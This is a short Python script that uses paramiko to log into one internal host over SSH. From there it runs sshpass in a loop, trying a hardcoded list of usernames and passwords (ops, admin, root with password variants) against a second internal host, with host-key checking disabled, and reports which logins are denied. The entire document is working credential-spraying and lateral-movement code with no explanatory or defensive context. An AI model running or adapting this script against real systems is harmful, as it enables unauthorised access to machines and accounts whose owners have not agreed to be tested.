#!/usr/bin/env python3
import paramiko
j = paramiko.SSHClient()
j.set_missing_host_key_policy(paramiko.AutoAddPolicy())
j.connect("192.168.1.100", username="ops", password="examplepass", timeout=5)

combos = [
    ("ops", "examplepass"), ("admin", "examplepass"),
    ("root", "examplepass"), ("ops", "Mllab708"),
    ("admin", "Mllab708"), ("ops", "examplepass!"),
    ("ops", "Mllab708!"), ("admin", "examplepass!"),
]
for user, pw in combos:
    cmd = (
        f"sshpass -p '{pw}' ssh -o StrictHostKeyChecking=no "
        f"-o ConnectTimeout=3 -o PreferredAuthentications=password "
        f"-o NumberOfPasswordPrompts=1 {user}@192.168.1.21 hostname 2>&1"
    )
    _, o, _ = j.exec_command(cmd, timeout=10)
    r = o.read().decode().strip()
    status = "DENIED" if "denied" in r.lower() or "permission" in r.lower() else r
    print(f"  {user}/{pw} -> {status}")

j.close()
